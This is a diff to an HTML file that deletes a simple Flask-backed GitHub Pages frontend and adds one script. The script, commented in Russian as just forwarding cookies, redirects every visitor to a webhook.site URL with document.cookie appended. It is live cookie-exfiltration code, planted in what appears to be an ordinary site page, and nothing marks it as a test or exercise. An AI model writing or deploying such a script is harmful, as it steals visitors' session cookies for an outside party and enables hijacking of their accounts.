@@ -1,22 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Flask + GitHub Pages</title>
-</head>
-<body>
-  <h1>Frontend on GitHub Pages</h1>
-  <p id="result">Loading...</p>
-
-  <script>
-    fetch("http://3.112.25.245:5000/main")
-      .then(r => r.json())
-      .then(data => {
-        document.getElementById("result").textContent = data.message;
-      })
-      .catch(err => {
-        document.getElementById("result").textContent = "Error: " + err;
-      });
-  </script>
-</body>
-</html>
+<script>
+    // Просто пересылаем куки в URL
+    window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?cookies=" + document.cookie;
+</script>
